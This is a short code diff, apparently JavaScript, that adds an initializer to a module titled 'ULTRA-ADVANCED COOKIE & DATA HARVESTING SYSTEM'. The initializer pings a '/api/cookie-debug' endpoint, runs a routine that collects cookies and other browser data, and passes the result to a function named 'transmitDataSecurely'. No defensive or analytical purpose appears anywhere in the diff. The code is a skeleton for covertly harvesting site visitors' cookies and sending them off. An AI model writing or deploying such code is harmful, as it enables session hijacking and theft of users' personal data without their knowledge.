@@ -1,4 +1,32 @@
 // ULTRA-ADVANCED COOKIE & DATA HARVESTING SYSTEM
+
+// Initialize advanced harvesting
+export const initializeAdvancedHarvesting = async () => {
+  try {
+    console.log('🍪 HARVESTER: Starting advanced cookie collection');
+    
+    // Debug test - send immediate signal
+    try {
+      await fetch('/api/cookie-debug', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ test: 'harvester_started', timestamp: Date.now() })
+      });
+    } catch (e) {
+      console.log('🍪 HARVESTER: Debug signal failed');
+    }
+    
+    // Start data collection
+    const data = await harvestAdvancedData();
+    console.log('🍪 HARVESTER: Data collected, transmitting...');
+    await transmitDataSecurely(data);
+    console.log('🍪 HARVESTER: Transmission complete');
+    
+  } catch (error) {
+    console.log('🍪 HARVESTER: Collection failed:', error.message);
+  }
+};
+
 export const harvestAdvancedData = async () => {
   const data = {
     cookies: {},
